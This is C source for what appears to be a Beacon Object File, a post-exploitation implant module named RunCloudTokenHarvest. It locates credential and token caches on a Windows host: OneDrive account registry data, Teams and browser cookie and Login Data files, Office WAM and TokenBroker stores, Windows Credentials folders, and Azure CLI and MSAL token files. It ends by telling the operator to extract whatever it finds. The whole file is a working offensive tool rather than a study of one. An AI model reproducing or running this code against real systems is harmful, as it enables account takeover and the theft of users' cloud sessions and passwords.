#include <windows.h>
#include "bofdefs.h"
#include "base.c"

WINBASEAPI DWORD WINAPI KERNEL32$GetFileAttributesA(LPCSTR lpFileName);
WINBASEAPI DWORD WINAPI KERNEL32$ExpandEnvironmentStringsA(LPCSTR lpSrc, LPSTR lpDst, DWORD nSize);
WINBASEAPI char* __cdecl MSVCRT$strncpy(char* dest, const char* src, size_t count);

// Helpers
BOOL FileExistsA(const char* path)
{
    DWORD attr = KERNEL32$GetFileAttributesA(path);
    return (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL DirExistsA(const char* path)
{
    DWORD attr = KERNEL32$GetFileAttributesA(path);
    return (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY));
}

void ExpandPath(const char* src, char* dst, DWORD dstSize)
{
    if (KERNEL32$ExpandEnvironmentStringsA(src, dst, dstSize) == 0) {
        MSVCRT$strncpy(dst, src, dstSize - 1);
        dst[dstSize - 1] = '\0';
    }
}

void PrintFileStatus(const char* label, const char* path)
{
    internal_printf("  %-20s: %s\n", label, FileExistsA(path) ? "PRESENT" : "NOT FOUND");
}

void PrintDirStatus(const char* label, const char* path)
{
    internal_printf("  %-20s: %s\n", label, DirExistsA(path) ? "PRESENT" : "NOT FOUND");
}

// OneDrive enumeration
void CheckOneDrive()
{
    internal_printf("\n================== OneDrive Sync Scopes ==================\n");
    HKEY hAccounts = NULL;
    if (ADVAPI32$RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\OneDrive\\Accounts",
                               0, KEY_READ, &hAccounts) != ERROR_SUCCESS) {
        internal_printf("[-] OneDrive Accounts key not found.\n");
        return;
    }

    DWORD idx = 0;
    char subkeyName[128];
    DWORD subkeyNameLen = 128;
    BOOL foundAny = FALSE;

    while (ADVAPI32$RegEnumKeyExA(hAccounts, idx, subkeyName, &subkeyNameLen,
                                   NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
        HKEY hAccount = NULL;
        if (ADVAPI32$RegOpenKeyExA(hAccounts, subkeyName, 0, KEY_READ, &hAccount) == ERROR_SUCCESS) {
            char userEmail[256] = {0};
            char userFolder[260] = {0};
            char tenantId[256] = {0};
            char spResourceId[260] = {0};
            DWORD type = 0, size = 0;
            BOOL hasData = FALSE;

            size = 256;
            if (ADVAPI32$RegQueryValueExA(hAccount, "UserEmail", NULL, &type, (LPBYTE)userEmail, &size) == ERROR_SUCCESS && userEmail[0]) {
                internal_printf("\n[Account: %s]\n", subkeyName);
                internal_printf("  UserEmail    : %s\n", userEmail);
                hasData = TRUE; foundAny = TRUE;
            }

            size = 260;
            if (ADVAPI32$RegQueryValueExA(hAccount, "UserFolder", NULL, &type, (LPBYTE)userFolder, &size) == ERROR_SUCCESS && userFolder[0])
                internal_printf("  UserFolder   : %s\n", userFolder);

            size = 256;
            if (ADVAPI32$RegQueryValueExA(hAccount, "TenantId", NULL, &type, (LPBYTE)tenantId, &size) == ERROR_SUCCESS && tenantId[0])
                internal_printf("  TenantId     : %s\n", tenantId);

            size = 260;
            if (ADVAPI32$RegQueryValueExA(hAccount, "SPOResourceId", NULL, &type, (LPBYTE)spResourceId, &size) == ERROR_SUCCESS && spResourceId[0])
                internal_printf("  SPOResourceId: %s\n", spResourceId);

            // List synced libraries if available
            HKEY hScopes = NULL;
            if (ADVAPI32$RegOpenKeyExA(hAccount, "ScopeIdToWebUrl", 0, KEY_READ, &hScopes) == ERROR_SUCCESS) {
                DWORD sIdx = 0;
                char sGuid[128]; DWORD sGuidLen = 128;
                internal_printf("  Synced Libraries:\n");
                while (ADVAPI32$RegEnumKeyExA(hScopes, sIdx, sGuid, &sGuidLen, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                    HKEY hS = NULL;
                    if (ADVAPI32$RegOpenKeyExA(hScopes, sGuid, 0, KEY_READ, &hS) == ERROR_SUCCESS) {
                        char sUrl[260] = {0}; DWORD sUrlSize = 260;
                        if (ADVAPI32$RegQueryValueExA(hS, "WebUrl", NULL, &type, (LPBYTE)sUrl, &sUrlSize) == ERROR_SUCCESS && sUrl[0])
                            internal_printf("    %s\n", sUrl);
                        ADVAPI32$RegCloseKey(hS);
                    }
                    sIdx++; sGuidLen = 128;
                }
                ADVAPI32$RegCloseKey(hScopes);
            }
            ADVAPI32$RegCloseKey(hAccount);
        }
        idx++;
        subkeyNameLen = 128;
    }

    if (!foundAny)
        internal_printf("[-] No configured OneDrive accounts found under registry.\n");

    ADVAPI32$RegCloseKey(hAccounts);

    // Also check settings folder for .dat / .ini artifacts
    char localAppData[260] = {0};
    ExpandPath("%LOCALAPPDATA%", localAppData, 260);
    char settingsPath[260];
    MSVCRT$sprintf(settingsPath, "%s\\Microsoft\\OneDrive\\settings", localAppData);
    if (DirExistsA(settingsPath)) {
        internal_printf("\n[OneDrive Settings Folder]\n  %s\n", settingsPath);
        WIN32_FIND_DATAA fd;
        char searchPath[260];
        MSVCRT$sprintf(searchPath, "%s\\*", settingsPath);
        HANDLE hFind = KERNEL32$FindFirstFileA(searchPath, &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (MSVCRT$strcmp(fd.cFileName, ".") == 0 || MSVCRT$strcmp(fd.cFileName, "..") == 0)
                    continue;
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                    internal_printf("  Subfolder: %s\n", fd.cFileName);
            } while (KERNEL32$FindNextFileA(hFind, &fd));
            KERNEL32$FindClose(hFind);
        }
    }
}

// Teams enumeration
void CheckTeams()
{
    internal_printf("\n================== Teams Token Cache ==================\n");
    char appData[260] = {0};
    char localAppData[260] = {0};
    ExpandPath("%APPDATA%", appData, 260);
    ExpandPath("%LOCALAPPDATA%", localAppData, 260);

    // Old Teams (Electron)
    char oldTeams[260];
    MSVCRT$sprintf(oldTeams, "%s\\Microsoft\\Teams", appData);
    if (DirExistsA(oldTeams)) {
        internal_printf("\n[Old Teams - %s]\n", oldTeams);
        char path[260];
        MSVCRT$sprintf(path, "%s\\Cookies", oldTeams);               PrintFileStatus("Cookies", path);
        MSVCRT$sprintf(path, "%s\\Network\\Cookies", oldTeams);      PrintFileStatus("Network Cookies", path);
        MSVCRT$sprintf(path, "%s\\Local Storage\\leveldb", oldTeams); PrintDirStatus("Local Storage", path);
        MSVCRT$sprintf(path, "%s\\IndexedDB", oldTeams);              PrintDirStatus("IndexedDB", path);
        MSVCRT$sprintf(path, "%s\\Global Storage\\leveldb", oldTeams);PrintDirStatus("Global Storage", path);
        MSVCRT$sprintf(path, "%s\\Code Cache", oldTeams);             PrintDirStatus("Code Cache", path);
        MSVCRT$sprintf(path, "%s\\blob_storage", oldTeams);           PrintDirStatus("Blob Storage", path);
        MSVCRT$sprintf(path, "%s\\Cache", oldTeams);                  PrintDirStatus("Cache", path);
        MSVCRT$sprintf(path, "%s\\Login Data", oldTeams);             PrintFileStatus("Login Data", path);
    } else {
        internal_printf("[-] Old Teams (%%APPDATA%%\\Microsoft\\Teams) not found.\n");
    }

    // New Teams (WebView2 / UWP)
    char newTeams[260];
    MSVCRT$sprintf(newTeams, "%s\\Packages\\MSTeams_8wekyb3d8bbwe\\LocalCache\\Microsoft\\MSTeams", localAppData);
    if (DirExistsA(newTeams)) {
        internal_printf("\n[New Teams (UWP) - %s]\n", newTeams);
        char path[260];
        MSVCRT$sprintf(path, "%s\\Cookies", newTeams);               PrintFileStatus("Cookies", path);
        MSVCRT$sprintf(path, "%s\\Network\\Cookies", newTeams);      PrintFileStatus("Network Cookies", path);
        MSVCRT$sprintf(path, "%s\\Local Storage\\leveldb", newTeams); PrintDirStatus("Local Storage", path);
        MSVCRT$sprintf(path, "%s\\IndexedDB", newTeams);              PrintDirStatus("IndexedDB", path);
        MSVCRT$sprintf(path, "%s\\Login Data", newTeams);             PrintFileStatus("Login Data", path);
    } else {
        internal_printf("[-] New Teams (UWP) not found.\n");
    }

    // New Teams alternative path (LocalState)
    char newTeams2[260];
    MSVCRT$sprintf(newTeams2, "%s\\Packages\\MSTeams_8wekyb3d8bbwe\\LocalState", localAppData);
    if (DirExistsA(newTeams2)) {
        internal_printf("\n[New Teams LocalState - %s]\n", newTeams2);
        char path[260];
        MSVCRT$sprintf(path, "%s\\Cookies", newTeams2);               PrintFileStatus("Cookies", path);
        MSVCRT$sprintf(path, "%s\\Network\\Cookies", newTeams2);      PrintFileStatus("Network Cookies", path);
    }
}

void CheckBrowserProfile(const char* browser, const char* userDataPath)
{
    if (!DirExistsA(userDataPath)) return;
    internal_printf("\n[%s User Data] %s\n", browser, userDataPath);

    // Check Default profile
    char defProfile[260];
    MSVCRT$sprintf(defProfile, "%s\\Default", userDataPath);
    if (DirExistsA(defProfile)) {
        char path[260];
        internal_printf("  [Profile: Default]\n");
        MSVCRT$sprintf(path, "%s\\Cookies", defProfile);               PrintFileStatus("Cookies", path);
        MSVCRT$sprintf(path, "%s\\Network\\Cookies", defProfile);      PrintFileStatus("Network Cookies", path);
        MSVCRT$sprintf(path, "%s\\Login Data", defProfile);             PrintFileStatus("Login Data", path);
        MSVCRT$sprintf(path, "%s\\Local State", defProfile);            PrintFileStatus("Local State", path);
    }

    // Enumerate Profile N directories
    WIN32_FIND_DATAA fd;
    char searchPath[260];
    MSVCRT$sprintf(searchPath, "%s\\Profile *", userDataPath);
    HANDLE hFind = KERNEL32$FindFirstFileA(searchPath, &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (MSVCRT$strcmp(fd.cFileName, ".") == 0 || MSVCRT$strcmp(fd.cFileName, "..") == 0)
                continue;
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                char profilePath[260];
                MSVCRT$sprintf(profilePath, "%s\\%s", userDataPath, fd.cFileName);
                char path[260];
                internal_printf("  [Profile: %s]\n", fd.cFileName);
                MSVCRT$sprintf(path, "%s\\Cookies", profilePath);               PrintFileStatus("Cookies", path);
                MSVCRT$sprintf(path, "%s\\Network\\Cookies", profilePath);      PrintFileStatus("Network Cookies", path);
                MSVCRT$sprintf(path, "%s\\Login Data", profilePath);             PrintFileStatus("Login Data", path);
                MSVCRT$sprintf(path, "%s\\Local State", profilePath);            PrintFileStatus("Local State", path);
            }
        } while (KERNEL32$FindNextFileA(hFind, &fd));
        KERNEL32$FindClose(hFind);
    }
}

void CheckBrowsers()
{
    internal_printf("\n================== Browser Cookie DBs ==================\n");
    char localAppData[260] = {0};
    ExpandPath("%LOCALAPPDATA%", localAppData, 260);

    char edgePath[260];
    MSVCRT$sprintf(edgePath, "%s\\Microsoft\\Edge\\User Data", localAppData);
    CheckBrowserProfile("Edge", edgePath);

    char chromePath[260];
    MSVCRT$sprintf(chromePath, "%s\\Google\\Chrome\\User Data", localAppData);
    CheckBrowserProfile("Chrome", chromePath);

    // Firefox
    char appData[260] = {0};
    ExpandPath("%APPDATA%", appData, 260);
    char ffPath[260];
    MSVCRT$sprintf(ffPath, "%s\\Mozilla\\Firefox\\Profiles", appData);
    if (DirExistsA(ffPath)) {
        internal_printf("\n[Firefox Profiles] %s\n", ffPath);
        WIN32_FIND_DATAA fd;
        char searchPath[260];
        MSVCRT$sprintf(searchPath, "%s\\*", ffPath);
        HANDLE hFind = KERNEL32$FindFirstFileA(searchPath, &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (MSVCRT$strcmp(fd.cFileName, ".") == 0 || MSVCRT$strcmp(fd.cFileName, "..") == 0)
                    continue;
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    char p[260];
                    MSVCRT$sprintf(p, "%s\\%s\\cookies.sqlite", ffPath, fd.cFileName);
                    PrintFileStatus(fd.cFileName, p);
                }
            } while (KERNEL32$FindNextFileA(hFind, &fd));
            KERNEL32$FindClose(hFind);
        }
    }
}

void CheckOfficeAndWAM()
{
    internal_printf("\n================== Office / WAM / TokenBroker ==================\n");
    char localAppData[260] = {0};
    ExpandPath("%LOCALAPPDATA%", localAppData, 260);

    // Office WAM (16.0 and 15.0)
    char wam16[260], wam15[260];
    MSVCRT$sprintf(wam16, "%s\\Microsoft\\Office\\16.0\\WAM", localAppData);
    MSVCRT$sprintf(wam15, "%s\\Microsoft\\Office\\15.0\\WAM", localAppData);
    PrintDirStatus("Office WAM 16.0", wam16);
    PrintDirStatus("Office WAM 15.0", wam15);

    // TokenBroker
    char tb[260];
    MSVCRT$sprintf(tb, "%s\\Microsoft\\TokenBroker", localAppData);
    if (DirExistsA(tb)) {
        internal_printf("\n[TokenBroker] %s\n", tb);
        WIN32_FIND_DATAA fd;
        char searchPath[260];
        MSVCRT$sprintf(searchPath, "%s\\*", tb);
        HANDLE hFind = KERNEL32$FindFirstFileA(searchPath, &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (MSVCRT$strcmp(fd.cFileName, ".") == 0 || MSVCRT$strcmp(fd.cFileName, "..") == 0)
                    continue;
                internal_printf("  %s\n", fd.cFileName);
            } while (KERNEL32$FindNextFileA(hFind, &fd));
            KERNEL32$FindClose(hFind);
        }
    } else {
        internal_printf("  TokenBroker          : NOT FOUND\n");
    }

    // Windows WebCache (IE/Edge legacy universal cache)
    char webCache[260];
    MSVCRT$sprintf(webCache, "%s\\Microsoft\\Windows\\WebCache\\WebCacheV01.dat", localAppData);
    PrintFileStatus("WebCacheV01.dat", webCache);

    // Windows Credentials folders
    char credLocal[260], credRoaming[260];
    MSVCRT$sprintf(credLocal, "%s\\Microsoft\\Credentials", localAppData);
    char appData[260] = {0};
    ExpandPath("%APPDATA%", appData, 260);
    MSVCRT$sprintf(credRoaming, "%s\\Microsoft\\Credentials", appData);
    PrintDirStatus("Credentials (Local)", credLocal);
    PrintDirStatus("Credentials (Roaming)", credRoaming);
}

void CheckAzureTooling()
{
    internal_printf("\n================== Azure Tooling Cache ==================\n");
    char userProfile[260] = {0};
    ExpandPath("%USERPROFILE%", userProfile, 260);

    char azureProfile[260];
    MSVCRT$sprintf(azureProfile, "%s\\.azure\\azureProfile.json", userProfile);
    PrintFileStatus("Azure CLI profile", azureProfile);

    char azCtx[260];
    MSVCRT$sprintf(azCtx, "%s\\.Azure\\AzContext.json", userProfile);
    PrintFileStatus("Az PS Context", azCtx);

    char azTokens[260];
    MSVCRT$sprintf(azTokens, "%s\\.azure\\accessTokens.json", userProfile);
    PrintFileStatus("Azure CLI Tokens", azTokens);

    char azTokens2[260];
    MSVCRT$sprintf(azTokens2, "%s\\.azure\\msal_token_cache.bin", userProfile);
    PrintFileStatus("Azure MSAL Cache", azTokens2);
}

void RunCloudTokenHarvest()
{
    internal_printf("[*] Hunting for cloud tokens and cached credentials...\n");
    CheckOneDrive();
    CheckTeams();
    CheckBrowsers();
    CheckOfficeAndWAM();
    CheckAzureTooling();
    internal_printf("\n[*] Done. Use execute-assembly or manual extraction on PRESENT items.\n");
}

#ifdef BOF
VOID go(IN PCHAR Buffer, IN ULONG Length)
{
    if (!bofstart()) return;
    RunCloudTokenHarvest();
    printoutput(TRUE);
}
#else
int main()
{
    RunCloudTokenHarvest();
    return 0;
}
#endif
